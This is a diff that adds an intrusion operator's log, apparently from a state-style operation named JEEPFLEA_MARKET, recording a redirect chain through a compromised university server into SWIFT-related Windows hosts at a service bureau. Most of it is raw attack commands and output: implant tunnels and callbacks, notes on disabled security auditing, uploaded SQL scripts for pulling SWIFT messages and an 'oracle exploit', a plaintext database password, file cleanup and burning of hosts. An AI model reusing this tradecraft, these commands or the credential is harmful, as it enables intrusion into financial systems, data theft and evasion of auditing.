@@ -1,0 +1,210 @@
+ISP:	LK
+City:	
+Phone:	
+ISP IP:	89.185.234.145
+Source IP:	
+FINAL target IP:	
+Ops Machine:	LOCALHOST.LOCALDOMAIN
+Redirecting Method 1:	PITCHIMPAIR
+Redirect Host 1:	133.94.1.3
+Redirect Target 1:	192.168.208.11
+Redirecting Method 2:	INCISION
+Redirect Host 2:	192.168.208.11
+Redirect Target 2:	192.168.200.52
+Redirecting Method 3:	INCISION
+Redirect Host 3:	192.168.208.11
+Redirect Target 3:	192.168.200.86
+
+
+BEGIN UNIX OPNOTES:
+
+Targets (IP, full domain name, target tags: pitchimpair unsuccessful not_attempted ) : 
+--> 133.94.1.3             cis.cc.kurume-it.ac.jp         pitchimpair          unix      successful    
+---> 192.168.208.11        ensbdmgmt2.eastnets.com        jeepflea_market      windows   successful    
+----> 192.168.200.52       ensbdsl2.eastnets.com          jeepflea_market      windows   successful    
+----> 192.168.200.86       ensbdnisl1.eastnets.com        jeepflea_market      windows   successful    
+Ops Machine: WO
+Results:
+
+PROJECT=JEEPFLEA_MARKET
+OPUSER=37322
+OPSCHEDULE=13050914490339
+SCRUBVER=6.006000037
+
+======================= P0
+--- 133.94.1.3   --- cis
+=======================
+ourtn -eY5U /current/up/noserver -wBIN 133.94.1.3
+
+2013-05-14 12:35:13 UTC -- on target
+
+  9:35pm  up 33 day(s), 22:52,  0 users,  load average: 0.00, 0.00, 0.00
+User     tty           login@  idle   JCPU   PCPU  what
+Tue May 14 21:35:30 JST 2013
+Tue May 14 12:35:30 GMT 2013
+
+SunOS cis 5.10 Generic_142900-09 sun4u sparc SUNW,Sun-Fire-V250
+
+
+-tunnel
+r 44378 192.168.254.72 44378
+
+2013-05-14 16:36:01 UTC -- burn
+
+
+
+
+
+
+LOCALHOST.LOCALDOMAIN: scrubhands v. 6.006000037 20130514-1225
+###################
+SCRUBHANDS v6.006000037 (suite v6.6.0.37 run in /192.168.254.71) command line:
+:
+/usr/local/bin/scrubhands -t -S 13050914490339 -I 37322 -P JEEPFLEA_MARKET -n 8.8.8.8 89.185.234.145/240/158
+###################
+Final lines of bwmonitor.txt:
+Tue May 14 16:38:39 UTC 2013
+eth0        bytes      (MB)    packets     kbps    (kBps)   kbps-1m  kbps-10m   kbps-hr
+  TX     10790208    (10.3)      33780      0.0     (0.0)       0.0       0.1       3.2
+  RX     20340406    (19.4)      35347      0.0     (0.0)       0.1       0.3       4.2
+
+###################################################
+PROJECT: JEEPFLEA_MARKET
+DATE: 12:31 PM 05/14/2013
+OPUSER: 37322
+OPSCHEDULE: 13050914490339
+#Op Status: Unsuccessful
+#Non-Standard: True
+###################################################
+Targets:
+
+
+
+Results:
+
+#z0.0.0.11 = 192.168.208.11 
+#z0.0.0.12,z0.0.0.13 = 192.168.200.52
+#z0.0.0.14,z0.0.0.15,z0.0.0.16 = 192.168.200.86
+
+======================= T1
+---   192.168.208.11    --- ENSBDMGMT2
+=======================
+
+
+Win2k8 64bit R2
+
+UR callback 44378
+	
+1:03 PM 5/14/2013 -- on target
+
+	Uptime:88 days, 14:46:22
+	Auditing:[2013-05-14 13:01:44 z0.0.0.11] Security auditing dorked, do not stop command 275 or you will lose your blessing
+	PSP: 
+	
+    12972 | 11452 | ------C:\Windows\system32\telnet.exe
+    
+    
+	dir -mask * -path c:\ -age 1h -recursive
+	prettych
+	quitanddelete
+	
+    monitor packetredirect -listenport 3333 -raw
+	redirect -tcp -implantlisten 4426 -target 127.0.0.1 4426
+	
+4:26 PM 5/14/2013 -- BURNED
+
+======================= T2
+---   192.168.200.52    --- ENSBDSL2
+=======================
+Win2k8 64 bit R2
+1:25 PM 5/14/2013	 PC2 target : 192.168.200.52
+		              source : 192.168.200.11
+                      final  : 192.168.200.52
+                      cb     : 4378, 192.168.200.11
+                      id     : 0x100011b3c
+					  
+                      key    : jeepflea_market
+                      ICMP   : ICMP 8,0
+		
+	Uptime:4 days, 16:6:5
+	Auditing:2013-05-14 13:30:17 z0.0.0.12] Security auditing dorked, do not stop command 798 or you will lose your blessing
+	PSP: Symantec Endpoint Protection 11
+    
+    |  3756 |   560 | ------D:\Double-Take\DoubleTake.exe 
+    
+    
+	grep -mask SPFILEACCESS.ORA -path D:\Alliance\Access\Database\database -pattern audit -nocase
+	cd c:\$Recycle.bin
+	put D:\DSZOPSDisk\Preps\swift_msg_queries_all.1368533247.sql -name C:\$Recycle.Bin\S-1-5-~1\$ICD12FA.txt
+	run -command "cmd.exe /q" -redirect
+	D:\alliance\access\database\bin\sqlplus.exe saauser/Aetq9f7CQtljCHtAmstCGF64C
+    1:59 PM 5/14/2013 -- disconnected when running the command
+    1:59 PM 5/14/2013 -- retriggered back on, checking logs
+        
+	SQL>@$ICD12FA.txt
+    
+    output file:$ICD12FB.txt
+    start:20130424
+    end:20130514
+    
+    2:16 PM 5/14/2013 -- getting file
+    2:20 PM 5/14/2013 -- clean up
+    delete $ICD12FA.txt
+    delete $ICD12FB.txt
+	
+	monitor packetredirect -listenport 3333 -raw
+	redirect -tcp -implantlisten 42316 -target 127.0.0.1 42316
+	dir -mask * -path c:\ -age 30m -recursive
+	prettych
+	quitanddelete
+	
+4:06 PM 5/14/2013 -- BURNED
+
+
+======================= T2
+---   192.168.200.86    --- ENSBDNISL1
+=======================
+Win2k8 64 bit R2
+2:31 PM 5/14/2013     PC2 target : 192.168.200.86
+		              source : 192.168.200.11
+                      final  : 192.168.200.86
+                      cb     : 4639, 192.168.200.11
+                      id     : 0x1000125ae
+					  key    : jeepflea_market
+                      ICMP   : ICMP 8,0
+		
+	Uptime:4 days, 16:7:18
+	Auditing:2013-05-14 14:37:03 z0.0.0.14] Security auditing dorked, do not stop command 1601 or you will lose your blessing
+	PSP: Symantec Endpoint Protection 11
+	grep -mask SPFILEACCESS.ORA -path D:\Alliance\Access\Database\database\ -pattern audit -nocase
+    3:03 PM 5/14/2013 -- EMAGENT.EXE not running, grep returned nothing
+	cd C:\$Recycle.Bin\S-1-5-~1
+    put D:\DSZOPSDisk\Preps\initial_oracle_exploit.1368537345.sql -name $ICD12FA.txt
+    	
+    
+    lsnrctl status
+    3:31 PM 5/14/2013 -- looking for listener
+    LSNRCTL for 64-bit Windows: Version 11.2.0.1.0 - Production on 14-MAY-2013 19:29:17
+
+Copyright (c) 1991, 2010, Oracle.  All rights reserved.
+
+Connecting to (ADDRESS=(PROTOCOL=tcp)(HOST=)(PORT=1521))
+TNS-12541: TNS:no listener
+ TNS-12560: TNS:protocol adapter error
+  TNS-00511: No listener
+   64-bit Windows Error: 61: Unknown error
+   
+	run -command "cmd.exe /q" -redirect
+	D:\alliance\access\database\bin\sqlplus.exe / as SYSDBA
+	3:19 PM 5/14/2013 -- failed to connect
+    SQL>@swift_msg_queries_all.sql
+    	
+    ERROR:
+ORA-12560: TNS:protocol adapter error
+
+	dir -mask * -path c:\ -age 3h -recursive
+	prettych
+    eventlogsurvey
+	quitanddelete
+	
+4:08 PM 5/14/2013 -- BURNED
